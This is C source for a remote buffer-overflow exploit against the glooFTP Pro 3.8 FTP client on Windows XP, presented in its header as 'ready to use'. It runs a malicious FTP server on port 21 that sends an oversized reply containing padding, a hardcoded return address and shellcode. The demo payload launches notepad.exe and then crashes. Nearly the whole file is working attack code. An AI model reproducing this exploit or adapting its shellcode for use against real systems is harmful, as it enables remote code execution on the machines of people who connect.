/* IglooExploit.c (Windows XP Professional Build 2600.x)
*
* vkhoshain@hotmail.com
* ---------------------------
* glooFTP Pro 3.8 Remote exploit code is ready to use ;)
* all you need to do is compile the source code and then
* run the program and wait for glooFTP Pro 3.8 connection
*
* This one doesn't do anything , just run notepad.exe and then crash
* the program by :
* INT 3 ;)
*
*/  

#include "winsock2.h"
#include "stdio.h"
#pragma comment (lib,"ws2_32")

int main()
{

        char spend[1024];
        char shellcode[] =
        "\x90\x90\x90\x90\x90\xEB\x13\x5F\x66\x31\xC0\x88\x47"
                                        "\x0E\x40\x50\x57\xB8\xC6\x84\xE6\x77\xFF\xD0\xCD\x03"
                                    "\xE8\xE8\xFF\xFF\xFF\x6E\x6F\x74\x65\x70\x61\x64\x20"    
                                                "\x20\x20\x20\x20\x20\x20\x23";           
        WSADATA wsaData;                                                       
        int s1,spt;
        struct sockaddr_in p;
        struct sockaddr_in emp;
        int len;
// Startup ...
        WSAStartup(0x0101,&wsaData);


// Creating first socket!
printf("Creating socket ...\n");
        if ((s1=socket(AF_INET,SOCK_STREAM,0))==-1){
                printf("Err in Creating socket\n");
                closesocket(s1);
                return 0;
        }
        p.sin_port = htons(21);
        p.sin_family =AF_INET; 
        p.sin_addr.s_addr = INADDR_ANY;



// Binding ---
printf("Binding ...\n");
        if ((bind(s1,(struct sockaddr*) &p,sizeof(p)))==-1)
        {
                printf("Err in Bind ...\n");
                closesocket(s1);
                return 0;
        }

printf("going to start listening\n");
if ((listen(s1,5))==-1)
{
        printf("Err in liten method ..\n");
        closesocket(s1);
        return 0;
}

len=sizeof(emp);

// ACCEPTING
printf("Listening on port 21 , please wait for glooFTP(ver3.8) connection
...\n");
spt=accept(s1,&emp,&len);
printf("The ftp client has just connected ,please wait ...\n");

send(spt,"200 ",4,0);                      // Sending "200 "


send(spt,spend,1024,0);                         //to recive RET addr place


send(spt,"\x79\xfc\xe9\x77",4,0);         //EIP Address (RET Addr)


send(spt,shellcode,46,0);                 //Sending Shellcode

send(spt,"\n",1,0);

closesocket(s1);
closesocket(spt);
printf("Shellcode has just sent , Done.\n");

return 0;

}
